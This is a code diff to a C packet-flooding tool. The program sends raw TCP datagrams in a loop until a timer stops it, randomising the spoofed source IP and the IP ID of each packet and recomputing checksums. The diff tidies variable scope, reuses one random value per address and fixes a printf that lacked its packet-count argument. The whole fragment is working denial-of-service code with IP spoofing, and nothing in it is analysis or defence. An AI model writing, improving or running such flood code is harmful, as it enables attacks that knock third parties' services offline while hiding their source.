@@ -103,12 +103,12 @@ uint8_t FLOODING = 1;
 
     // vars to change the same tcp header flags
     register int i = 0;
-    if (USE_RANDOM_FLAGS) {
-        uint16_t psh = 0;
-        uint16_t res1 = 0;
-        uint16_t res2 = 0;
-    }
-
+    //if (USE_RANDOM_FLAGS) {
+    uint16_t psh = 0;
+    uint16_t res1 = 0;
+    uint16_t res2 = 0;
+    //}
+    uint32_t rand_num;
     //printf("Starting Flood\n");
     // after RUN_SECONDS is done FLOODING is set to 0 in the main thread ending the loop
     while(FLOODING)
@@ -117,10 +117,11 @@ uint8_t FLOODING = 1;
         sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &dst, sizeof(dst));
 
         // rerandomize
-        iph->ip_src = (rand_cmwc() >> 24 & 0xFF) << 24 |
-                      (rand_cmwc() >> 16 & 0xFF) << 16 |
-                      (rand_cmwc() >> 8 & 0xFF) << 8 |
-                      (rand_cmwc() & 0xFF);
+        rand_num = rand_cmwc();
+        iph->ip_src = (rand_num >> 24 & 0xFF) << 24 |
+                      (rand_num >> 16 & 0xFF) << 16 |
+                      (rand_num >> 8 & 0xFF) << 8 |
+                      (rand_num & 0xFF);
 
         iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
         iph->check = checksum ((uint16_t*) datagram, iph->tot_len);
@@ -141,7 +142,7 @@ uint8_t FLOODING = 1;
         i++;
         tcph->check = tcp_checksum(iph, tcph);
     }
-    printf("Done! sent %d packets\n");
+    printf("Done! sent %d packets\n", i);
     #ifndef _WIN32
         __sync_fetch_and_sub(&thread_count,1);
     #endif
